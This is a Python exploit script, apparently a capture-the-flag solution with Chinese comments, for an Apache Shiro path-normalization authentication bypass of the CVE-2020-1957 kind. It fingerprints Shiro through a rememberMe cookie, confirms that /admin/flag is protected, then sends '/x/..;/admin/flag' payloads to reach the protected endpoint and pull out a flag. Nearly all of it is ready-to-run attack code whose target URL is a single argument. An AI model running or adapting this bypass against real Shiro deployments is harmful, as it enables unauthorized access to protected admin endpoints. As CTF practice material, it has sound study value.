#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""exp.py —— Shiro 路径归一化认证绕过（CVE-2020-1957 类）

目标：http://eecygvjtll13hant.neu-nex.fun/   （实例已过期，换成新实例 URL 即可复跑）
漏洞：Shiro authc 按原始 URI 匹配，Spring 归一化后执行 —— /x/..;/admin/flag 绕过
依赖：仅标准库
用法：python exp.py [--url URL]
"""
import argparse
import re
import sys
import urllib.error
import urllib.request


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


OPENER = urllib.request.build_opener(NoRedirect)
UA = 'exp/1.0 (+authorized-ctf)'


def get(url, headers=None):
    req = urllib.request.Request(url, headers={'User-Agent': UA, **(headers or {})})
    try:
        r = OPENER.open(req, timeout=15)
        return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--url', default='http://eecygvjtll13hant.neu-nex.fun/')
    args = ap.parse_args()
    base = args.url.rstrip('/')

    # 步骤 1：Shiro 指纹
    st, hd, _ = get(base + '/', {'Cookie': 'rememberMe=AAAA'})
    sc = hd.get('Set-Cookie', '')
    print(f'[1] fingerprint: status={st} set-cookie={sc}')
    if 'rememberMe=deleteMe' not in sc:
        print('    [!] 未检测到 Shiro deleteMe，换目标或换指纹方式')
        return 1

    # 步骤 2：受保护端点（必须关重定向，否则 302 后的 404 会误判）
    st, hd, _ = get(base + '/admin/flag')
    print(f'[2] direct /admin/flag: status={st} location={hd.get("Location", "")}')
    if st != 302:
        print('    [!] 直连未拦截，可能不需要绕过')
        return 1

    # 步骤 3：路径归一化绕过
    for payload in ('/x/..;/admin/flag', '/x/..;/admin/flag/'):
        st, hd, body = get(base + payload)
        text = body.decode('utf-8', 'replace')
        print(f'[3] {payload}: status={st} body={text[:120]!r}')
        m = re.search(r'nex\{[A-Za-z0-9_]+\}', text)
        if st == 200 and m:
            print(f'[+] FLAG: {m.group(0)}')
            return 0

    print('[-] 未拿到 flag：检查实例是否存活 / 换其它归一化变体')
    return 1


if __name__ == '__main__':
    sys.exit(main())
